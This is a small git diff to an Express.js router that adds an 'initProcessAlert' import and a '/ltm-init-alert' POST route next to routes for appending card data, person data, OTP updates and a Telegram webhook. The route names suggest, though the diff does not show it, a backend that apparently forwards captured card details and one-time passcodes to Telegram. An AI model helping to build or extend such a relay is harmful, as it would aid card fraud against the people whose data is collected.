@@ -1,5 +1,5 @@
 import express from "express";
-import { initProcess, telegramWebhook, sendSimpleMessage, updateMessageWithOtp, appendCardData, appendPersonData, latamSimpleMsj, editLatamMsj } from "../controllers/botController.js";
+import { initProcess, telegramWebhook, sendSimpleMessage, updateMessageWithOtp, appendCardData, appendPersonData, latamSimpleMsj, editLatamMsj, initProcessAlert } from "../controllers/botController.js";
 
 const router = express.Router();
 
@@ -11,5 +11,6 @@ router.post('/append-person-data', appendPersonData);
 router.post('/update-message-otp', updateMessageWithOtp);
 router.post('/ltm-send-message', latamSimpleMsj);
 router.post('/ltm-edit-message', editLatamMsj);
+router.post('/ltm-init-alert', initProcessAlert);
 
 export default router;
